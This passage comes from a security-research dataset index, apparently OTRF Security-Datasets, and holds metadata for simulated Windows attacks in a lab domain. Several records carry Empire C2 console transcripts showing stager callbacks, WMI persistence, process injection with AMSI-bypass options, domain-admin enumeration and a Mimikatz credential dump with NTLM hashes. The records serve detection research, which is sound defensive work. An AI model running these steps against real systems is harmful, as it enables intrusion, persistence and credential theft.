http\n(Empire: stager/windows/launcher_vbs) > execute\n\n[*] Stager output written out to: /tmp/launcher.vbs\n\n(Empire: stager/windows/launcher_vbs) > \n[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5\n[*] New agent K47LRAEP checked in\n[+] Initial agent K47LRAEP from 172.18.39.5 now active (Slack)\n[*] Sending agent (stage 2) to K47LRAEP at 172.18.39.5\n\n(Empire: stager/windows/launcher_vbs) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nK47LRAEP ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         2316   5/0.0    2020-09-04 20:10:07  http            \n\n(Empire: agents) > interact K47LRAEP\n(Empire: K47LRAEP) > \n(Empire: K47LRAEP) > shell whoami\n[*] Tasked K47LRAEP to run TASK_SHELL\n[*] Agent K47LRAEP tasked with task ID 1\n(Empire: K47LRAEP) > \ntheshire\\pgustavo\n..Command execution completed.\n\n(Empire: K47LRAEP) > \n(Empire: K47LRAEP) > "
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:27.407609+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190518184306.yaml": {
        "title": "Empire Elevated WMI Eventing",
        "id": "SDWIN-190518184306",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/05/18",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "Local WMI Eventing",
            "WMI Event Subscriptions"
        ],
        "description": "This dataset represents adversaries leveraging WMI subscriptions locally for persistence.",
        "attack_mappings": [
            {
                "technique": "T1546",
                "sub-technique": "003",
                "tactics": [
                    "TA0003",
                    "TA0004"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/persistence/host/empire_wmi_local_event_subscriptions_elevated_user.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "wmi",
                    "script": "https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "(Empire: powershell/privesc/bypassuac_fodhelper) > agents\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n28BNF7RH ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5392   5/0.0    2020-09-04 20:31:17  http            \nW2TBCPHU ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         5584   5/0.0    2020-09-04 20:42:01  http            \n13ZK6G7M ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5676   5/0.0    2020-09-04 20:41:59  http            \n\n(Empire: agents) > interact 13ZK6G7M\n(Empire: 13ZK6G7M) > \n(Empire: 13ZK6G7M) > usemodule persistence/elevated/wmi*\n(Empire: powershell/persistence/elevated/wmi) > info\n\n              Name: Invoke-WMI\n            Module: powershell/persistence/elevated/wmi\n        NeedsAdmin: True\n        OpsecSafe: False\n          Language: powershell\nMinLanguageVersion: 2\n        Background: False\n  OutputExtension: None\n\nAuthors:\n  @mattifestation\n  @harmj0y\n  @jbooz1\n\nDescription:\n  Persist a stager (or script) using a permanent WMI\n  subscription. This has a difficult detection/removal rating.\n\nComments:\n  https://github.com/mattifestation/PowerSploit/blob/master/Pe\n  rsistence/Persistence.psm1\n\nOptions:\n\n  Name        Required    Value                     Description\n  ----        --------    -------                   -----------\n  Agent       True        13ZK6G7M                  Agent to run module on.                 \n  Listener    True        http                      Listener to use.                        \n  DailyTime   False                                 Daily time to trigger the script        \n                                                    (HH:mm).                                \n  AtStartup   False       True                      Switch. Trigger script (within 5        \n                                                    minutes) of system startup.             \n  FailedLogon False                                 Trigger script with a failed logon      \n                                                    attempt from a specified user           \n  SubName     True        Updater                   Name to use for the event subscription. \n  ExtFile     False                                 Use an external file for the payload    \n                                                    instead of a stager.                    \n  Cleanup     False                                 Switch. Cleanup the trigger and any     \n                                                    script from specified location.         \n  UserAgent   False       default                   User-agent string to use for the staging\n                                                    request (default, none, or other).      \n  Proxy       False       default                   Proxy to use for request (default, none,\n                                                    or other).                              \n  ProxyCreds  False       default                   Proxy credentials                       \n                                                    ([domain\\]username:password) to use for \n                                                    request (default, none, or other).      \n\n(Empire: powershell/persistence/elevated/wmi) > execute\n[>] Module is not opsec safe, run? [y/N] y\n[*] Tasked 13ZK6G7M to run TASK_CMD_WAIT\n[*] Agent 13ZK6G7M tasked with task ID 1\n[*] Tasked agent 13ZK6G7M to run module powershell/persistence/elevated/wmi\n(Empire: powershell/persistence/elevated/wmi) > \nWMI persistence established using listener http with OnStartup WMI subsubscription trigger.\n\n(Empire: powershell/persistence/elevated/wmi) > \n(Empire: powershell/persistence/elevated/wmi) > \n[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5\n[*] New agent PYA28EDF checked in\n[+] Initial agent PYA28EDF from 172.18.39.5 now active (Slack)\n[*] Sending agent (stage 2) to PYA28EDF at 172.18.39.5\n\n(Empire: powershell/persistence/elevated/wmi) > \n(Empire: powershell/persistence/elevated/wmi) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n28BNF7RH ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5392   5/0.0    2020-09-04 20:31:17  http            \nW2TBCPHU ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         5584   5/0.0    2020-09-04 20:43:48  http            \n13ZK6G7M ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5676   5/0.0    2020-09-04 20:43:48  http            \n\nPYA28EDF ps 172.18.39.5     WORKSTATION5      *THESHIRE\\SYSTEM        powershell         7480   5/0.0    2020-09-04 20:49:29  http            \n\n(Empire: agents) > interact PYA28EDF\n(Empire: PYA28EDF) > shell whoami\n[*] Tasked PYA28EDF to run TASK_SHELL\n[*] Agent PYA28EDF tasked with task ID 1\n(Empire: PYA28EDF) > \nnt authority\\system\n..Command execution completed.\n\n(Empire: PYA28EDF) > \n(Empire: PYA28EDF) >"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:30.986938+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190518200432.yaml": {
        "title": "Empire PSInject",
        "id": "SDWIN-190518200432",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/05/18",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "PE Injection",
            "WriteProcessMemory",
            "CreateRemoteThread Execution"
        ],
        "description": "This dataset represents adversaries reflectively loading/intecting a portable executable (PE) (not on disk) into a process via WriteprocessMemory and executed via CreateRemoteThread APIs",
        "attack_mappings": [
            {
                "technique": "T1055",
                "sub-technique": "003",
                "tactics": [
                    "TA0004",
                    "TA0005"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/empire_psinject_PEinjection.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "PSInject",
                    "script": "https://github.com/EmpireProject/Empire/blob/dev/data/module_source/management/Invoke-PSInject.ps1"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "[*] Active agents:\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n62HY9XCK ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         3172   5/0.0    2020-08-07 14:30:45  http            \nF82SZKVW ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6008   5/0.0    2020-08-07 18:31:11  http            \n\n(Empire: agents) > interact F82SZKVW\n(Empire: F82SZKVW) > \n(Empire: F82SZKVW) > \n(Empire: F82SZKVW) > usemodule management/psinject\n(Empire: powershell/management/psinject) > \n(Empire: powershell/management/psinject) > set ProcName notepad\n(Empire: powershell/management/psinject) > set Listener http\n(Empire: powershell/management/psinject) > info\n\n              Name: Invoke-PSInject\n            Module: powershell/management/psinject\n        NeedsAdmin: False\n        OpsecSafe: True\n          Language: powershell\nMinLanguageVersion: 2\n        Background: True\n  OutputExtension: None\n\nAuthors:\n  @harmj0y\n  @sixdub\n  leechristensen (@tifkin_)\n\nDescription:\n  Utilizes Powershell to to inject a Stephen Fewer formed\n  ReflectivePick which executes PS codefrom memory in a remote\n  process. ProcID or ProcName must be specified.\n\nComments:\n  http://sixdub.net\n\nOptions:\n\n  Name             Required    Value                     Description\n  ----             --------    -------                   -----------\n  Agent            True        F82SZKVW                  Agent to run module on.                 \n  ProcId           False                                 ProcessID to inject into.               \n  ProcName         False       notepad                   Process name to inject into.            \n  Listener         True        http                      Listener to use.                        \n  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n                                                        powershell code, uses the               \n                                                        ObfuscateCommand for obfuscation types. \n                                                        For powershell only.                    \n  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n                                                        Only used if Obfuscate switch is True.  \n                                                        For powershell only.                    \n  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n                                                        the stager code.                        \n  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n                                                        the stager code.                        \n  UserAgent        False       default                   User-agent string to use for the staging\n                                                        request (default, none, or other).      \n  Proxy            False       default                   Proxy to use for request (default, none,\n                                                        or other).                              \n  ProxyCreds       False       default                   Proxy credentials                       \n                                                        ([domain\\]username:password) to use for \n                                                        request (default, none, or other).      \n\n(Empire: powershell/management/psinject) > execute\n[*] Tasked F82SZKVW to run TASK_CMD_JOB\n[*] Agent F82SZKVW tasked with task ID 1\n[*] Tasked agent F82SZKVW to run module powershell/management/psinject\n(Empire: powershell/management/psinject) > \nJob started: F48GDZ\n\n[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5\n[*] New agent Y9RCLV64 checked in\n[+] Initial agent Y9RCLV64 from 172.18.39.5 now active (Slack)\n[*] Sending agent (stage 2) to Y9RCLV64 at 172.18.39.5\n\n(Empire: powershell/management/psinject) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n62HY9XCK ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         3172   5/0.0    2020-08-07 14:30:45  http            \nF82SZKVW ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6008   5/0.0    2020-08-07 18:32:51  http            \nY9RCLV64 ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       notepad            2576   5/0.0    2020-08-07 18:32:52  http            \n\n(Empire: agents) >"
        },
        "references": [
            "https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/",
            "https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick#psinjectps1"
        ],
        "mp_last_updated": "2022-01-08T01:49:31.176289+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190518201207.yaml": {
        "title": "Empire Shell Net Domain Admins",
        "id": "SDWIN-190518201207",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/05/18",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "Domain Groups Enumeration",
            "RPC SAMR SamrQueryInformationGroup"
        ],
        "description": "This dataset represents adversaries enumerating members of domain groups (i.e. Domain Admins) via RPC SAMR interface over SMB. Some of the main RPC methods captured over the network are SamrLookupNamesInDomain (Opnum 17) and SamrQueryInformationGroup (Opnum 20) where there are indicators about the specific group name enumerated.",
        "attack_mappings": [
            {
                "technique": "T1069",
                "sub-technique": "002",
                "tactics": [
                    "TA0007"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/discovery/host/empire_shell_rpc_samr_smb_group_domain_admins_standard_user.zip"
            },
            {
                "type": "network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/discovery/network/empire_shell_rpc_samr_smb_group_domain_admins_standard_user.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "shell",
                    "script": null
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "(Empire: stager/multi/launcher) > \n[*] Sending POWERSHELL stager (stage 1) to 172.18.39.6\n[*] New agent GM4LN8V9 checked in\n[+] Initial agent GM4LN8V9 from 172.18.39.6 now active (Slack)\n[*] Sending agent (stage 2) to GM4LN8V9 at 172.18.39.6\nagents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nA7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \nHBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \nUF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 21:28:07  http            \n\nGM4LN8V9 ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         5724   5/0.0    2020-09-21 08:05:25  http            \n\n(Empire: agents) > interact GM4LN8V9\n(Empire: GM4LN8V9) > shell net group \"Domain Admins\" /domain\n[*] Tasked GM4LN8V9 to run TASK_SHELL\n[*] Agent GM4LN8V9 tasked with task ID 1\n(Empire: GM4LN8V9) > \nThe request will be processed at a domain controller for domain theshire.local.\n\nGroup name     Domain Admins\nComment        Designated administrators of the domain\n\nMembers\n\n-------------------------------------------------------------------------------\nmscott                   pgustavo                 wardog                   \nThe command completed successfully.\n\n..Command execution completed.\n\n(Empire: GM4LN8V9) >"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:31.355711+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190518201922.yaml": {
        "title": "Empire WDigest Downgrade",
        "id": "SDWIN-190518201922",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/05/18",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "Registry Modification",
            "Windows Registry WDigest"
        ],
        "description": "This dataset represents adversaries setting the UseLogonCredential property value from HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest key to 1 to enable plain text passwords.",
        "attack_mappings": [
            {
                "technique": "T1112",
                "sub-technique": null,
                "tactics": [
                    "TA0005"
                ]
            }
        ],
        "notebooks": [
            {
                "project": "Threat Hunter Playbook",
                "name": "WDigest Downgrade",
                "link": "https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-190510202010.html"
            }
        ],
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/empire_wdigest_downgrade.tar.gz"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "wdigest_downgrade",
                    "script": "https://github.com/EmpireProject/Empire/blob/dev/lib/modules/powershell/management/wdigest_downgrade.py"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": null
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:31.531296+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190518202151.yaml": {
        "title": "Empire Mimikatz LogonPasswords",
        "id": "SDWIN-190518202151",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/05/18",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "LSASS Memory Credentials Read"
        ],
        "description": "This dataset represents adversaries reading credentials from the memory contents of lsass.exe. One popular tool performing this behavior is Mimikatz.",
        "attack_mappings": [
            {
                "technique": "T1003",
                "sub-technique": "001",
                "tactics": [
                    "TA0006"
                ]
            }
        ],
        "notebooks": [
            {
                "project": "Threat Hunter Playbook",
                "name": "LSASS Access from Non System Account",
                "link": "https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-170105221010.html"
            }
        ],
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_mimikatz_logonpasswords.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "credentials",
                    "script": "https://github.com/OTRF/Blacksmith/blob/master/aws/Security-Datasets/cfn-files/scripts/Invoke-Mimikatz.ps1"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "(Empire: agents) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n62HY9XCK ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         3172   5/0.0    2020-08-07 14:30:45  http            \nB7Y8G4XC ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         1648   5/0.0    2020-08-07 14:31:46  http            \n\n(Empire: agents) > interact B7Y8G4XC\n(Empire: B7Y8G4XC) > \n(Empire: B7Y8G4XC) > usemodule credentials/mimikatz/logonpasswords*\n(Empire: powershell/credentials/mimikatz/logonpasswords) > info\n\n              Name: Invoke-Mimikatz DumpCreds\n            Module: powershell/credentials/mimikatz/logonpasswords\n        NeedsAdmin: True\n        OpsecSafe: True\n          Language: powershell\nMinLanguageVersion: 2\n        Background: True\n  OutputExtension: None\n\nAuthors:\n  @JosephBialek\n  @gentilkiwi\n\nDescription:\n  Runs PowerSploit's Invoke-Mimikatz function to extract\n  plaintext credentials from memory.\n\nComments:\n  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com\n\nOptions:\n\n  Name  Required    Value                     Description\n  ----  --------    -------                   -----------\n  Agent True        B7Y8G4XC                  Agent to run module on.                 \n\n(Empire: powershell/credentials/mimikatz/logonpasswords) > execute\n[*] Tasked B7Y8G4XC to run TASK_CMD_JOB\n[*] Agent B7Y8G4XC tasked with task ID 1\n[*] Tasked agent B7Y8G4XC to run module powershell/credentials/mimikatz/logonpasswords\n(Empire: powershell/credentials/mimikatz/logonpasswords) > \nJob started: FH5UKE\n\nHostname: WORKSTATION5.theshire.local / S-1-5-21-1363495622-3806888128-621328882\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  4 2020 20:16:54\n.## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz(powershell) # sekurlsa::logonpasswords\n\nAuthentication Id : 0 ; 2868007 (00000000:002bc327)\nSession           : RemoteInteractive from 2\nUser Name         : pgustavo\nDomain            : THESHIRE\nLogon Server      : MORDORDC\nLogon Time        : 8/5/2020 9:46:24 PM\nSID               : S-1-5-21-1363495622-3806888128-621328882-1104\n        msv :\n        [00000003] Primary\n        * Username : pgustavo\n        * Domain   : THESHIRE\n        * NTLM     : 81d310fa34e6a56a31145445891bb7b8\n        * SHA1     : 2a953d745ed80427e309d957d20b0eeca3cd3d69\n        * DPAPI    : be8815c8ec59ddeda43d2301dbc29c2c\n        tspkg :\n        wdigest :\n        * Username : pgustavo\n        * Domain   : THESHIRE\n        * Password : [placeholder]\n        kerberos :\n        * Username : pgustavo\n        * Domain   : THESHIRE.LOCAL\n        * Password : (null)\n        ssp :\n        credman :\n        cloudap :\n\nAuthentication Id : 0 ; 2860578 (00000000:002ba622)\nSession           : RemoteInteractive from 2\nUser Name         : pgustavo\nDomain            : THESHIRE\nLogon Server      : MORDORDC\nLogon Time        : 8/5/2020 9:46:24 PM\nSID               : S-1-5-21-1363495622-3806888128-621328882-1104\n        msv :\n        [00000003] Primary\n        * Username : pgustavo\n        * Domain   : THESHIRE\n        * NTLM     : 81d310fa34e6a56a31145445891bb7b8\n        * SHA1     : 2a953d745ed80427e309d957d20b0eeca3cd3d69\n        * DPAPI    : be8815c8ec59ddeda43d2301dbc29c2c\n        tspkg :\n        wdigest :\n        * Username : pgustavo\n        * Domain   : THESHIRE\n        * Password : [placeholder]\n        kerberos :\n        * Username : pgustavo\n        * Domain   : THESHIRE.LOCAL\n        * Password : (null)\n        ssp :\n        credman :\n        cloudap :\n\nAuthentication Id : 0 ; 2778269 (00000000:002a649d)\nSession           : Interactive from 2\nUser Name         : DWM-2\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 8/5/2020 9:46:21 PM\nSID               : S-1-5-90-0-2\n        msv :\n        [00000003] Primary\n        * Username : WORKSTATION5$\n        * Domain   : THESHIRE\n        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b\n        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7\n        tspkg :\n        wdigest :\n        * Username : WORKSTATION5$\n        * Domain   : THESHIRE\n        * Password : [placeholder][placeholder][placeholder]\n        kerberos :\n        * Username : WORKSTATION5$\n        * Domain   : theshire.local\n        * Password : [placeholder][placeholder][placeholder]\n        ssp :\n        credman :\n        cloudap :\n\nAuthentication Id : 0 ; 2776485 (00000000:002a5da5)\nSession           : Interactive from 2\nUser Name         : DWM-2\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 8/5/2020 9:46:21 PM\nSID               : S-1-5-90-0-2\n        msv :\n        [00000003] Primary\n        * Username : WORKSTATION5$\n        * Domain   : THESHIRE\n        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b\n        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7\n        tspkg :\n        wdigest :\n        * Username : WORKSTATION5$\n        * Domain   : THESHIRE\n        * Password : [placeholder][placeholder][placeholder]\n        kerberos :\n        * Username : WORKSTATION5$\n        * Domain   : theshire.local\n        * Password : [placeholder][placeholder][placeholder]\n        ssp :\n        credman :\n        cloudap :\n\nAuthentication Id : 0 ; 2771168 (00000000:002a48e0)\nSession           : Interactive from 2\nUser Name         : UMFD-2\nDomain            : Font Driver Host\nLogon Server      : (null)\nLogon Time        : 8/5/2020 9:46:20 PM\nSID               : S-1-5-96-0-2\n        msv :\n        [00000003] Primary\n        * Username : WORKSTATION5$\n        * Domain   : THESHIRE\n        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b\n        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7\n        tspkg :\n        wdigest :\n        * Username : WORKSTATION5$\n        * Domain   : THESHIRE\n        * Password : [placeholder][placeholder][placeholder]\n        ssp :\n        credman :\n        cloudap :\n\nAuthentication Id : 0 ; 997 (00000000:000003e5)\nSession           : Service from 0\nUser Name         : LOCAL SERVICE\nDomain            : NT AUTHORITY\nLogon Server      : (null)\nLogon Time        : 8/5/2020 9:26:08 PM\nSID               : S-1-5-19\n        msv :\n        tspkg :\n        wdigest :\n        * Username : (null)\n        * Domain   : (null)\n        * Password : (null)\n        kerberos :\n        * Username : (null)\n        * Domain   : (null)\n        * Password : (null)\n        ssp :\n        credman :\n        cloudap :\n\nAuthentication Id : 0 ; 56937 (00000000:0000de69)\nSession           : Interactive from 1\nUser Name         : DWM-1\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 8/5/2020 9:26:08 PM\nSID               : S-1-5-90-0-1\n        msv :\n        [00000003] Primary\n        * Username : WORKSTATION5$\n        * Domain   : THESHIRE\n        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b\n        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7\n        tspkg :\n        wdigest :\n        * Username : WORKSTATION5$\n        * Domain   : THESHIRE\n        * Password : [placeholder][placeholder][placeholder]\n        ssp :\n        credman :\n        cloudap :\n\nAuthentication Id : 0 ; 56865 (00000000:0000de21)\nSession           : Interactive from 1\nUser Name         : DWM-1\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 8/5/2020 9:26:08 PM\nSID               : S-1-5-90-0-1\n        msv :\n        [00000003] Primary\n        * Username : WORKSTATION5$\n        * Domain   : THESHIRE\n        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b\n        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7\n        tspkg :\n        wdigest :\n        * Username : WORKSTATION5$\n        * Domain   : THESHIRE\n        * Password : [placeholder][placeholder][placeholder]        kerberos :\n        * Username : WORKSTATION5$\n        * Domain   : theshire.local\n        * Password : [placeholder][placeholder][placeholder]\n        ssp :\n        credman :\n        cloudap :\n\nAuthentication Id : 0 ; 996 (00000000:000003e4)\nSession           : Service from 0\nUser Name         : WORKSTATION5$\nDomain            : THESHIRE\nLogon Server      : (null)\nLogon Time        : 8/5/2020 9:26:07 PM\nSID               : S-1-5-20\n        msv :\n        [00000003] Primary\n        * Username : WORKSTATION5$\n        * Domain   : THESHIRE\n        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b\n        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7\n        tspkg :\n        wdigest :\n        * Username : WORKSTATION5$\n        * Domain   : THESHIRE\n        * Password : [placeholder][placeholder][placeholder]\n        kerberos :\n        * Username : workstation5$\n        * Domain   : THESHIRE.LOCAL\n        * Password : (null)\n        ssp :\n        credman :\n        cloudap :\n\nAuthentication Id : 0 ; 33194 (00000000:000081aa)\nSession           : Interactive from 0\nUser Name         : UMFD-0\nDomain            : Font Driver Host\nLogon Server      : (null)\nLogon Time        : 8/5/2020 9:26:07 PM\nSID               : S-1-5-96-0-0\n        msv :\n        [00000003] Primary\n        * Username : WORKSTATION5$\n        * Domain   : THESHIRE\n        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b\n        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7\n        tspkg :\n        wdigest :\n        * Username : WORKSTATION5$\n        * Domain   : THESHIRE\n        * Password : [placeholder][placeholder][placeholder]\n        kerberos :\n        * Username : WORKSTATION5$\n        * Domain   : theshire.local\n        * Password : [placeholder][placeholder][placeholder]\n        ssp :\n        credman :\n        cloudap :\n\nAuthentication Id : 0 ; 33086 (00000000:0000813e)\nSession           : Interactive from 1\nUser Name         : UMFD-1\nDomain            : Font Driver Host\nLogon Server      : (null)\nLogon Time        : 8/5/2020 9:26:07 PM\nSID               : S-1-5-96-0-1\n        msv :\n        [00000003] Primary\n        * Username : WORKSTATION5$\n        * Domain   : THESHIRE\n        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b\n        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7\n        tspkg :\n        wdigest :\n        * Username : WORKSTATION5$\n        * Domain   : THESHIRE\n        * Password : [placeholder][placeholder][placeholder]\n        kerberos :\n        * Username : WORKSTATION5$\n        * Domain   : theshire.local\n        * Password : [placeholder][placeholder][placeholder]\n        ssp :\n        credman :\n        cloudap :\n\nAuthentication Id : 0 ; 31553 (00000000:00007b41)\nSession           : UndefinedLogonType from 0\nUser Name         : (null)\nDomain            : (null)\nLogon Server      : (null)\nLogon Time        : 8/5/2020 9:26:07 PM\nSID               : \n        msv :\n        [00000003] Primary\n        * Username : WORKSTATION5$\n        * Domain   : THESHIRE\n        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b\n        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7\n        tspkg :\n        wdigest :\n        kerberos :\n        ssp :\n        credman :\n        cloudap :\n\nAuthentication Id : 0 ; 999 (00000000:000003e7)\nSession           : UndefinedLogonType from 0\nUser Name         : WORKSTATION5$\nDomain            : THESHIRE\nLogon Server      : (null)\nLogon Time        : 8/5/2020 9:26:06 PM\nSID               : S-1-5-18\n        msv :\n        tspkg :\n        wdigest :\n        * Username : WORKSTATION5$\n        * Domain   : THESHIRE\n        * Password : [placeholder][placeholder][placeholder]\n        kerberos :\n        * Username : workstation5$\n        * Domain   : THESHIRE.LOCAL\n        * Password : (null)\n        ssp :\n        credman :\n        cloudap :\n\nmimikatz(powershell) # exit\nBye!\n\n(Empire: powershell/credentials/mimikatz/logonpasswords) >"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:31.738297+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190518203650.yaml": {
        "title": "Empire Enable RDP",
        "id": "SDWIN-190518203650",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/05/18",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "Registry Modification",
            "Windows Registry RDP Settings"
        ],
        "description": "This dataset represents adversaries enabling RDP and adding a firewall exception to a compromised system",
        "attack_mappings": [
            {
                "technique": "T1112",
                "sub-technique": null,
